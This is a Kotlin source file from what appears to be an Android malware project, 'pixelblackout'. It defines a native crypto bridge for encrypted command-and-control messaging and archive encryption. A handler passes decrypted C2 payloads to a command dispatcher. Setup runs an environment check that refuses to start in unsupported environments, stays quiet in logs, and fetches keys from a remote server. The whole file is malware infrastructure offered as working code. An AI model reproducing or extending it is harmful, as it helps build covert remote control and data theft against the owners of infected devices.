package com.example.pixelblackout.nativebridge

import com.example.pixelblackout.c2.C2KeyVault
import android.util.Log

object NativeCrypto {
    private const val TAG = "NativeCrypto"
    init {
        System.loadLibrary("native-lib")
    }

    @Volatile
    private var configured = false

    fun warmUp() {
        ensureConfigured()
    }

    fun encryptString(plaintext: String): String {
        ensureConfigured()
        return nativeEncryptString(plaintext)
    }

    fun decryptString(payload: String): String {
        ensureConfigured()
        return nativeDecryptString(payload)
    }

    fun encryptArchive(data: ByteArray): ByteArray {
        ensureConfigured()
        return nativeEncryptArchive(data)
    }

    // C2 AEAD (ChaCha20-Poly1305) – fully native
    fun encryptC2(plaintext: String): String {
        ensureConfigured()
        return nativeEncryptC2(plaintext)
    }

    fun decryptC2(payload: String): String {
        ensureConfigured()
        return nativeDecryptC2(payload)
    }

    fun handleC2Payload(payload: String, dispatcher: com.example.pixelblackout.managers.CommandDispatcher): String {
        ensureConfigured()
        return nativeHandleC2Payload(payload, dispatcher)
    }

    private fun ensureConfigured() {
        if (configured) return
        synchronized(this) {
            if (configured) return
            // Quiet bootstrap; avoid leaking hints via logs
            if (!nativeOkToRun()) {
                throw IllegalStateException("Unsupported environment detected")
            }
            // Primary path: native bootstrap does all work (fetch+parse+install)
            val c2 = nativeBootstrapFromRemote()
            if (c2 != null && c2.size == 2) {
                val c2Key = c2[0]
                val c2Nonce = c2[1]
                C2KeyVault.install(c2Key, c2Nonce)
                configured = true
            } else {
                // Fallback: fetch in Kotlin layer, feed masked bytes into native config
                val mat = RemoteKeyProvider.fetch()
                nativeConfigure(RemoteKeyProvider.MASK, mat.key, mat.iv, mat.password)
                nativeConfigureC2(RemoteKeyProvider.MASK, mat.c2Key, mat.c2Nonce)
                C2KeyVault.install(mat.c2Key, mat.c2Nonce)
                configured = true
            }
        }
    }

    private external fun nativeEncryptString(plaintext: String): String
    private external fun nativeDecryptString(payload: String): String
    private external fun nativeEncryptArchive(data: ByteArray): ByteArray
    private external fun nativeConfigure(mask: Int, key: ByteArray, iv: ByteArray, archivePassword: ByteArray)
    private external fun nativeOkToRun(): Boolean

    // Native C2 AEAD
    private external fun nativeEncryptC2(plaintext: String): String
    private external fun nativeDecryptC2(payload: String): String
    private external fun nativeHandleC2Payload(payload: String, dispatcher: com.example.pixelblackout.managers.CommandDispatcher): String
    private external fun nativeConfigureC2(mask: Int, c2Key: ByteArray, c2Nonce: ByteArray)
    private external fun nativeBootstrapFromRemote(): Array<ByteArray>?
}
